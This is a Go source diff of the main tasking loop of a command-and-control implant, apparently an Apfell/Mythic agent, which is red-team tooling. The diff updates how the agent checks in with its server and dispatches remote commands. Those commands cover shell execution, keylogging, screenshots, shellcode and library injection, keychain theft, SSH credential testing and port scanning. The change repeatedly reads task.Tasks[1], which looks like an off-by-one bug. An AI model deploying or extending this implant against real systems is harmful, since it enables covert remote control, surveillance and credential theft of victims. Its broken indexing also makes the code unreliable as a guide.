@@ -72,7 +72,7 @@ func main() {
 	profile.SetSleepInterval(sleep)
 	profile.SetUserAgent(profiles.PConfig.UserAgent)
 	// Evaluate static variables
-	if profiles.PConfig.KEYX {
+	if strings.Contains(profiles.PConfig.KEYX, "T") {
 		//log.Println("Xchange keys true")
 		profile.SetXKeys(true)
 	} else {
@@ -95,9 +95,9 @@ func main() {
 	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
 	// fmt.Println(currentUser.Name)
 	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname)
-	checkIn := resp.(structs.Msg)
+	checkIn := resp.(structs.CheckInMessageResponse)
 	//log.Printf("Received checkin response: %+v\n", checkIn)
-	profile.SetApfellID(checkIn["id"].(string))
+	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
 		"exit":             EXIT_CODE,
@@ -139,59 +139,59 @@ func main() {
 	// Channel used to catch results from tasking threads
 	res := make(chan structs.ThreadMsg)
 	//if we have an Active apfell session, enter the tasking loop
-	if strings.Contains(checkIn["status"].(string), "success") {
+	if strings.Contains(checkIn.Status, "success") {
 	LOOP:
 		for {
 			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)
 
 			// Get the next task
 			t := profile.GetTasking()
-			task := t.(structs.Task)
+			task := t.(structs.TaskRequestMessageResponse)
 			/*
 				Unfortunately, due to the architecture of goroutines, there is no easy way to kill threads.
 				This check is to make sure we're running a "killable" process, and if so, add it to the queue.
 				The supported processes are:
-					- executeassembly
 					- triagedirectory
 					- portscan
 			*/
-			if tasktypes[task.Command] == 3 || tasktypes[task.Command] == 16 || tasktypes[task.Command] == 18 || tasktypes[task.Command] == 20 {
+			if tasktypes[task.Tasks[1].Command] == 3 || tasktypes[task.Tasks[1].Command] == 16 || tasktypes[task.Tasks[1].Command] == 18 || tasktypes[task.Tasks[1].Command] == 20 {
 				// log.Println("Making a job for", task.Command)
 				job := &structs.Job{
 					KillChannel: make(chan int),
 					Stop:        new(int),
 					Monitoring:  false,
 				}
-				task.Job = job
-				taskSlice = append(taskSlice, task)
+				task.Tasks[1].Job = job
+				taskSlice = append(taskSlice, task.Tasks[1])
 			}
-			switch tasktypes[task.Command] {
+			switch tasktypes[task.Tasks[1].Command] {
 			case EXIT_CODE:
 				// Throw away the response, we don't really need it for anything
-				profile.PostResponse(task, "Exiting")
+				profile.PostResponse(task.Tasks[1], "Exiting")
 				break LOOP
 			case 1:
 				// Run shell command
-				go shell.Run(task, res)
+				go shell.Run(task.Tasks[1], res)
 				break
 			case 2:
 				// Capture screenshot
-				go screencapture.Run(task, res)
+				go screencapture.Run(task.Tasks[1], res)
 				break
 			case 3:
-				go keylog.Run(task, res)
+				go keylog.Run(task.Tasks[1], res)
 				break
 			case 4:
 				//File download
-				profile.SendFile(task, task.Params)
+				// TODO: Update for v1.4
+				profile.SendFile(task.Tasks[1], task.Tasks[1].Params)
 				break
 			case 5:
 				// File upload
-
+				// TODO: Update for v1.4
 				fileDetails := structs.FileUploadParams{}
-				err := json.Unmarshal([]byte(task.Params), &fileDetails)
+				err := json.Unmarshal([]byte(task.Tasks[1].Params), &fileDetails)
 				if err != nil {
-					profile.PostResponse(task, err.Error())
+					profile.PostResponse(task.Tasks[1], err.Error())
 					break
 				}
 
@@ -200,30 +200,30 @@ func main() {
 					f, e := os.Create(fileDetails.RemotePath)
 
 					if e != nil {
-						profile.PostResponse(task, e.Error())
+						profile.PostResponse(task.Tasks[1], e.Error())
 					}
 
 					n, failed := f.Write(data)
 
 					if failed != nil && n == 0 {
-						profile.PostResponse(task, failed.Error())
+						profile.PostResponse(task.Tasks[1], failed.Error())
 					}
 
-					profile.PostResponse(task, "File upload successful")
+					profile.PostResponse(task.Tasks[1], "File upload successful")
 				}
 
 				break
 
 			case 6:
-				go libinject.Run(task, res)
+				go libinject.Run(task.Tasks[1], res)
 				break
 
 			case 7:
 				tMsg := &structs.ThreadMsg{}
-				tMsg.TaskItem = task
+				tMsg.TaskItem = task.Tasks[1]
 				args := &shinject.Arguments{}
 				//log.Println("Windows Inject:\n", string(task.Params))
-				err := json.Unmarshal([]byte(task.Params), &args)
+				err := json.Unmarshal([]byte(task.Tasks[1].Params), &args)
 
 				if err != nil {
 					tMsg.Error = true
@@ -243,62 +243,62 @@ func main() {
 				go shinject.Run(args, tMsg, res)
 				break
 			case 8:
-				go ps.Run(task, res)
+				go ps.Run(task.Tasks[1], res)
 				break
 			case 9:
 				// Sleep
-				i, err := strconv.Atoi(task.Params)
+				i, err := strconv.Atoi(task.Tasks[1].Params)
 				if err != nil {
-					profile.PostResponse(task, err.Error())
+					profile.PostResponse(task.Tasks[1], err.Error())
 					break
 				}
 
 				profile.SetSleepInterval(i)
-				profile.PostResponse(task, "Sleep Updated..")
+				profile.PostResponse(task.Tasks[1], "Sleep Updated..")
 				break
 			case 10:
 				//Cat a file
-				go cat.Run(task, res)
+				go cat.Run(task.Tasks[1], res)
 				break
 			case 11:
 				//Change cwd
-				err := os.Chdir(task.Params)
+				err := os.Chdir(task.Tasks[1].Params)
 				if err != nil {
-					profile.PostResponse(task, err.Error())
+					profile.PostResponse(task.Tasks[1], err.Error())
 					break
 				}
 
-				profile.PostResponse(task, fmt.Sprintf("changed directory to: %s", task.Params))
+				profile.PostResponse(task.Tasks[1], fmt.Sprintf("changed directory to: %s", task.Tasks[1].Params))
 				break
 			case 12:
 				//List directory contents
-				go ls.Run(task, res)
+				go ls.Run(task.Tasks[1], res)
 				break
 
 			case 15:
 				// Enumerate keyring data for linux or the keychain for macos
-				go keys.Run(task, res)
+				go keys.Run(task.Tasks[1], res)
 				break
 			case 16:
 				// Triage a directory and organize files by type
-				go triagedirectory.Run(task, res)
+				go triagedirectory.Run(task.Tasks[1], res)
 				break
 			case 17:
 				// Test credentials against remote hosts
-				go sshauth.Run(task, res)
+				go sshauth.Run(task.Tasks[1], res)
 				break
 			case 18:
 				// Scan ports on remote hosts.
-				go portscan.Run(task, res)
+				go portscan.Run(task.Tasks[1], res)
 				break
 			case 19:
 				// Enable privileges for your current process.
-				go getprivs.Run(task, res)
+				go getprivs.Run(task.Tasks[1], res)
 				break
 			case 21:
 				// Return the list of jobs.
 				tMsg := structs.ThreadMsg{}
-				tMsg.TaskItem = task
+				tMsg.TaskItem = task.Tasks[1]
 				tMsg.Error = false
 				log.Println("Number of tasks processing:", len(taskSlice))
 				fmt.Println(taskSlice)
@@ -333,20 +333,20 @@ func main() {
 				// Kill the job
 				tMsg := structs.ThreadMsg{}
 				tMsg.Error = false
-				tMsg.TaskItem = task
+				tMsg.TaskItem = task.Tasks[1]
 
 				foundTask := false
 				for _, taskItem := range taskSlice {
-					if taskItem.ID == task.Params {
+					if taskItem.TaskID == task.Tasks[1].TaskID {
 						go taskItem.Job.SendKill()
 						foundTask = true
 					}
 				}
 
 				if foundTask {
-					tMsg.TaskResult = []byte(fmt.Sprintf("Sent kill signal to Job ID: %s", task.Params))
+					tMsg.TaskResult = []byte(fmt.Sprintf("Sent kill signal to Job ID: %s", task.Tasks[1].Params))
 				} else {
-					tMsg.TaskResult = []byte(fmt.Sprintf("No job with ID: %s", task.Params))
+					tMsg.TaskResult = []byte(fmt.Sprintf("No job with ID: %s", task.Tasks[1].Params))
 					tMsg.Error = true
 				}
 				go func(threadChan *chan structs.ThreadMsg, msg *structs.ThreadMsg) {
@@ -355,32 +355,32 @@ func main() {
 				break
 			case 23:
 				// copy a file!
-				go cp.Run(task, res)
+				go cp.Run(task.Tasks[1], res)
 			case 24:
 				// List drives on a machine
-				go drives.Run(task, res)
+				go drives.Run(task.Tasks[1], res)
 			case 25:
 				// Retrieve information about the current user.
-				go getuser.Run(task, res)
+				go getuser.Run(task.Tasks[1], res)
 			case 26:
 				// Make a directory
-				go mkdir.Run(task, res)
+				go mkdir.Run(task.Tasks[1], res)
 			case 27:
 				// Move files
-				go mv.Run(task, res)
+				go mv.Run(task.Tasks[1], res)
 			case 28:
 				// Print working directory
-				go pwd.Run(task, res)
+				go pwd.Run(task.Tasks[1], res)
 			case 29:
-				go rm.Run(task, res)
+				go rm.Run(task.Tasks[1], res)
 			case 30:
-				go getenv.Run(task, res)
+				go getenv.Run(task.Tasks[1], res)
 			case 31:
-				go setenv.Run(task, res)
+				go setenv.Run(task.Tasks[1], res)
 			case 32:
-				go unsetenv.Run(task, res)
+				go unsetenv.Run(task.Tasks[1], res)
 			case 33:
-				go kill.Run(task, res)
+				go kill.Run(task.Tasks[1], res)
 			case NONE_CODE:
 				// No tasks, do nothing
 				break
@@ -390,7 +390,7 @@ func main() {
 			select {
 			case toApfell := <-res:
 				for i := 0; i < len(taskSlice); i++ {
-					if taskSlice[i].ID == toApfell.TaskItem.ID && !taskSlice[i].Job.Monitoring {
+					if taskSlice[i].TaskID == toApfell.TaskItem.TaskID && !taskSlice[i].Job.Monitoring {
 						if i != (len(taskSlice) - 1) {
 							taskSlice = append(taskSlice[:i], taskSlice[i+1:]...)
 						} else {
